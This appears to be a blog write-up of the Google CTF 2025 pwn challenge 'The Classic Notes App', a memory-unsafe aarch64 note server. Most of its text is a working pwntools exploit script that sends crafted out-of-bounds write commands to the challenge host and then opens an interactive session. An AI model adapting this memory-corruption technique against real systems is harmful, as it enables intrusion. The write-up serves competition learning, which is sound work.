---
title: Google CTF 2025 Writeup | PWN - The Classic Notes App
slug: googlectf25-the-classic-notes-app
author: Utkarsh M
date: '2025-07-16'
description: "Writeup and solution for the Google CTF 2025 - The Classic Notes App challenge."
categories:
  - CTFs
tags:
  - write up
  - web
  - ctf
  - google
  - googlectf
  - reverse engineering
  - pwn
  - re
  - vm

---

### Challenge Details

> RC's notebook server. RC does not care about memory safety because *** protects him!<br>
> Author: RC, roguebantha


Connection string: `the-classic-notes-app.2025.ctfcompetition.com 1337`

files: `ctf.c, Dockerfile, nsjail.cfg, qemu-aarch64`

-------------------

## Application

It's a simple note-taking application built for the aarch64 architecture running through QEMU on the challenge server.

You can interact with it using commands like:

```sh
Give me your command:
R 1    
Note at 1: World!
Give me your command:
C 3
Give me your command:
W 2 0 3ABC
Give me your command:
R 2
Note at 2: ABC�
Give me your command:
```

## Solving the challenges

The following image illustrates the solution process for the challenge in detail.

![](/assets/img/ctf/googlectf25/the-classic-notes-app.png)

## solution

```py
import pwn

while True:
    try:
        t = pwn.remote('the-classic-notes-app.2025.ctfcompetition.com', 1337)
        t.timeout = None
        t.recvuntil(b'Give me your command:\n')
        t.sendline(b'W 1 32 2' + b'\xa0\x02')
        k = t.recvuntil(b'Give me your command:\n')
        t.sendline(b'W 0 0 4' + b'exit')
        t.recvuntil(b'Give me your command:\n')
        t.sendline(b'W 0 50 100'+ b'\xAA'*100)
        print(k)
        t.interactive()
        break
    except EOFError:
        try:
            t.close()
        except Exception:
            pass
        continue
```

[Github Gist ](https://gist.github.com/Utkar5hM/6606ed6bbde5e3729a13b7f8a778c2e6)

## Obtaining the flag

![](/assets/img/ctf/googlectf25/the-classic-notes-app-2.png)